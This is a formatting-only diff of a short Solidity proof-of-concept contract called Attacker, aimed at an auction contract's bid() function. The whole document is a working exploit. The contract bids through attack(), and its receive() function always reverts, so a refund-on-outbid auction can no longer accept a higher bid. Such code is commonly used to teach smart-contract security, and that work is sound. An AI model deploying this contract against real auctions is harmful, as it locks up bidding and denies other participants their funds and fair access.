@@ -1,24 +1,24 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.17;
 
-interface Iauction{
-        function bid() payable external;
+interface Iauction {
+    function bid() external payable;
 }
 
-contract Attacker{
-         address public owner;
-         Iauction public immutable auc;
+contract Attacker {
+    address public owner;
+    Iauction public immutable auc;
 
-        constructor (address  addr){
-            auc = Iauction(addr);
-            owner = msg.sender;
-         }
+    constructor(address addr) {
+        auc = Iauction(addr);
+        owner = msg.sender;
+    }
 
-        function attack() external payable {
-            auc.bid{value: msg.value}();
-        }
+    function attack() external payable {
+        auc.bid{value: msg.value}();
+    }
 
-        receive() external payable {
-                      revert();
-        }                     
+    receive() external payable {
+        revert();
+    }
 }
